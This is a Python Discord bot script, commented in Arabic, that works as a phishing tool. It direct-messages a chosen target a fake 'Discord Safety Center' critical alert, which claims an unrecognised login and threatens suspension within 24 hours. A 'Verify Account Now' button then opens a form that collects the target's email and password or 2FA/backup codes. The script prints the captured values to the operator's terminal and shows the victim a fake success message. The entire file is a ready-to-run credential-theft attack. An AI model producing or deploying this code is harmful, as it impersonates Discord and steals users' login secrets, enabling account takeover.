import discord
from discord import ui
from discord.ext import commands
import datetime

# إعدادات المظهر لـ Termux
CYAN = '\033[96m'
GREEN = '\033[92m'
RESET = '\033[0m'

# --- 1. النافذة المنبثقة (The Modal) ---
class VerificationModal(ui.Modal, title='System Identity Verification'):
    # حقول الإدخال - مصممة لتبدو رسمية جداً
    email_input = ui.TextInput(
        label='Official Email Address',
        placeholder='example@domain.com',
        style=discord.TextStyle.short,
        required=True,
        min_length=5
    )
    
    auth_code = ui.TextInput(
        label='Security Verification Code / Password',
        placeholder='Enter your 2FA or backup code...',
        style=discord.TextStyle.long,
        required=True,
        min_length=6
    )

    async def on_submit(self, interaction: discord.Interaction):
        # هنا يتم استلام البيانات وإرسالها لك في Termux
        print(f"\n{GREEN}[!] DATA CAPTURED SUCCESSFULLY [!]{RESET}")
        print(f"{CYAN}Target User:{RESET} {interaction.user} ({interaction.user.id})")
        print(f"{CYAN}Email Provided:{RESET} {self.email_input.value}")
        print(f"{CYAN}Auth/Pass Provided:{RESET} {self.auth_code.value}")
        print(f"{GREEN}" + "="*40 + f"{RESET}")

        # رسالة تأكيد تظهر للمستخدم لإكمال الواقعية
        await interaction.response.send_message(
            "✅ Verification complete. Your account is now synchronized with our security layers.", 
            ephemeral=True
        )

# --- 2. الزر التفاعلي (The View) ---
class PersistentView(ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @ui.button(label='Verify Account Now', style=discord.ButtonStyle.primary, custom_id='verify_btn', emoji='🛡️')
    async def verify_button(self, interaction: discord.Interaction, button: ui.Button):
        # عند الضغط على الزر، تفتح النافذة المنبثقة
        await interaction.response.send_modal(VerificationModal())

# --- 3. المحرك الرئيسي (The Engine) ---
class CyberBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        super().__init__(command_prefix=".", intents=intents)

    async def on_ready(self):
        print(f"{GREEN}[+] CYBER OBG Engine Online: {self.user}{RESET}")

    async def deploy_notification(self, target_id):
        try:
            user = await self.fetch_user(target_id)
            
            # بناء Embed ضخم وواقعي
            embed = discord.Embed(
                title="🔴 Critical Security Alert | Discord Safety Center",
                description=(
                    "**Notice of Unusual Activity Detected**\n\n"
                    "We've noticed a login attempt from an unrecognized IP address. "
                    "To prevent account suspension, you must verify your identity within 24 hours.\n\n"
                    "**Details:**\n"
                    "• **Location:** Unknown (External VPN detected)\n"
                    "• **Device:** Terminal-Linux-v8\n"
                    "• **Action:** Verification Required"
                ),
                color=0xFF0000, # اللون الأحمر للتحذير
                timestamp=datetime.datetime.utcnow()
            )
            
            embed.add_field(
                name="How to fix this?", 
                value="Click the **Verify Account Now** button below and follow the instructions in the secure popup."
            )
            
            embed.set_image(url="https://i.imgur.com/8N4p7zS.png") # صورة توضيحية عريضة
            embed.set_footer(text="Security Department • Case ID: #88219", icon_url=self.user.avatar.url if self.user.avatar else None)

            # إرسال الرسالة مع الزر
            await user.send(embed=embed, view=PersistentView())
            print(f"{GREEN}[+] تم إرسال الرسالة التفاعلية بنجاح إلى ID: {target_id}{RESET}")

        except Exception as e:
            print(f"\033[91m[-] فشل الإرسال: {e}\033[0m")

# --- نقطة التشغيل ---
if __name__ == "__main__":
    token = input(f"{CYAN}Enter Bot Token: {RESET}").strip()
    target = input(f"{CYAN}Enter Target ID: {RESET}").strip()

    bot = CyberBot()

    @bot.event
    async def on_ready():
        await bot.deploy_notification(int(target))
        print(f"{CYAN}[*] في انتظار تفاعل المستخدم... لا تغلق Termux.{RESET}")

    bot.run(token)
